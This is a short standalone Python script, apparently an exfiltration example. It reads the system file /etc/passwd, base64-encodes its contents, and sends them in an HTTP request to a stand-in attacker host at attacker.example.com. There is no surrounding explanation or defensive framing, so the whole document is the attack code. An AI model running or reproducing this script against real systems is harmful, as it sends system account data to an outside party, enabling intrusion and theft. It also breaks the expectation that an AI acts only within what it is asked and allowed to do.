import base64
import urllib.request

data = open("/etc/passwd").read()
encoded = base64.b64encode(data.encode()).decode()
urllib.request.urlopen(f"http://attacker.example.com/exfil?p={encoded}")
